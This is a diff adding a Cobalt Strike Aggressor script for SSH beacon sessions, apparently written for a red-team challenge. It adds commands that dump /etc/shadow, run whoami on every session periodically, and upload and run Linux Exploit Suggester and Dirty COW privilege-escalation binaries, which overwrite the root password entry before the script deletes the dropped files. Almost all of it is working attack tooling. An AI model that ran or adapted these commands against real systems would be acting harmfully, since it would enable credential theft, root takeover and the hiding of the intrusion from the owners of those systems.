@@ -1,0 +1,77 @@
+on ssh_initial {
+    $bid = $1;
+    $user = beacon_info($1, "user");
+    $arch = beacon_info($1, "barch");
+    bnote($1,"B-ID: $1 - $arch - $user");
+}
+
+ssh_alias hashdump {
+    if (-isadmin $1) {
+        binput($1, "cat /etc/shadow");
+        bshell($1, "cat /etc/shadow");
+    }
+    else {
+        berror($1, "You're (probably) not an admin");
+    }
+}
+
+on heartbeat_30s {
+    foreach $session (beacons()) {
+        if (-isssh $session['id']) {
+            bshell($session['id'], "whoami");
+        }
+    }
+}
+
+popup ssh {
+    menu "Defender" {
+        item "Begin..." {
+            addAll(@watchlist, $1);
+    
+            #Update the host
+                show_message("Added to watchlist: $1");
+        }
+    }
+}
+
+popup ssh {
+    menu "Escalate" {
+        item "Exploit Suggester" {
+            foreach $bid ($1) {
+                $host = binfo($bid, "external");
+		        bcd($1, "/tmp");
+                bupload($1, "/root/Documents/67-CW-Challenge/Linux/les.sh");
+		        bshell($1, "bash /tmp/les.sh -g > /tmp/results.txt");
+		        bpause($1, "2000");
+		        shell($1, "cat /tmp/results.txt");
+                shell($1, "rm /tmp/les.sh");
+            }
+        }
+	item "Dirty Dirty C0W" {
+        foreach $bid ($1) {
+		    bcd($1, "/tmp");
+            if (-is64 $1){
+                bupload($1, "/root/Documents/67-CW-Challenge/Linux/dirty_64");
+                bshell($1, "rm -f passwd.bak; chmod +x /tmp/dirty_64");
+                bshell($1, "/tmp/dirty_64 team33isthebest");
+                bshell($1, "rm /tmp/dirty_64");
+            }else{
+                bupload($1, "/root/Documents/67-CW-Challenge/Linux/dirty_32");
+                bshell($1, "rm -f passwd.bak; chmod +x /tmp/dirty_32");
+                bshell($1, "/tmp/dirty_32 team33isthebest");
+                bshell($1, "rm /tmp/dirty_32");
+            }
+            bpause($1, "2000");
+            }
+        }
+	item "Sendpage Exploit" {
+            foreach $bid ($1) {
+		        bcd($1, "/tmp");
+                bupload($1, "/root/Documents/67-CW-Challenge/Linux/les.sh");
+		        bshell($1, "bash /tmp/les.sh -g > /tmp/results.txt");
+		        bpause($1, "2000");
+		        bshell($1, "cat /tmp/results.txt");
+            }
+        }
+    }
+}
